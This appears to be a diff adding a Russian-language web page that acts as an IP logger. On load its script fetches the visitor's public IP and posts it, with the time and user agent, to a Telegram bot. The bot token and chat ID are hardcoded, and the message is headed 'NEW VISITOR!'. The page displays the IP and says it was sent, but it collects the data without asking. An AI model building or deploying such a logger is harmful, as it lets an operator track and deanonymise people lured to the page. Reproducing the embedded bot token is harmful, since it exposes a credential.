@@ -1,0 +1,117 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>IP в Telegram</title>
+    <style>
+        body {
+            background: #0a0f1a;
+            font-family: monospace;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            margin: 0;
+            padding: 20px;
+        }
+        .container {
+            background: #0f1420;
+            padding: 30px;
+            border-radius: 16px;
+            text-align: center;
+            border: 1px solid #2a3a5a;
+            max-width: 400px;
+        }
+        .ip {
+            font-size: 32px;
+            font-weight: bold;
+            color: #00ffcc;
+            margin: 20px 0;
+            word-break: break-all;
+        }
+        .status {
+            color: #88aaff;
+            font-size: 14px;
+        }
+        .success { color: #00ff88; }
+        .error { color: #ff6666; }
+        .time {
+            font-size: 11px;
+            color: #556;
+            margin-top: 15px;
+        }
+    </style>
+</head>
+<body>
+<div class="container">
+    <h3>⚡ IP → Telegram</h3>
+    <div class="ip" id="ip">--.--.--.--</div>
+    <div class="status" id="status">Определение IP...</div>
+    <div class="time" id="time"></div>
+</div>
+
+<script>
+    (function() {
+        const ipEl = document.getElementById('ip');
+        const statusEl = document.getElementById('status');
+        const timeEl = document.getElementById('time');
+        
+        // ВАШИ ДАННЫЕ
+        const BOT_TOKEN = "8682117571:AAFaiVkLatOworYWC-JCBXMNG9qWawphmpw";
+        const CHAT_ID = "6064445519";
+        
+        // Засекаем время
+        const startTime = Date.now();
+        
+        // Получение IP (быстро)
+        async function getIP() {
+            try {
+                const res = await fetch('https://api.ipify.org?format=json', { signal: AbortSignal.timeout(2000) });
+                const data = await res.json();
+                return data.ip || null;
+            } catch(e) {
+                return null;
+            }
+        }
+        
+        // Отправка в Telegram (без ожидания)
+        function sendToTelegram(ip) {
+            const now = new Date();
+            const time = now.toLocaleString('ru-RU');
+            const ua = navigator.userAgent;
+            const message = `🌐 НОВЫЙ ПОСЕТИТЕЛЬ!\n━━━━━━━━━━━━━━━━\n📌 IP: ${ip}\n⏰ Время: ${time}\n💻 User-Agent: ${ua.substring(0, 100)}`;
+            
+            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+            
+            fetch(url, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ chat_id: CHAT_ID, text: message })
+            }).catch(() => {});
+        }
+        
+        // Основной запуск
+        async function init() {
+            const ip = await getIP();
+            const elapsed = ((Date.now() - startTime) / 1000).toFixed(1);
+            timeEl.innerText = `⏱️ ${elapsed} сек`;
+            
+            if (!ip) {
+                ipEl.innerText = 'Ошибка';
+                statusEl.innerText = '❌ Не удалось определить IP';
+                statusEl.className = 'status error';
+                return;
+            }
+            
+            ipEl.innerText = ip;
+            sendToTelegram(ip);
+            statusEl.innerText = '✅ Отправлено в Telegram!';
+            statusEl.className = 'status success';
+        }
+        
+        init();
+    })();
+</script>
+</body>
+</html>
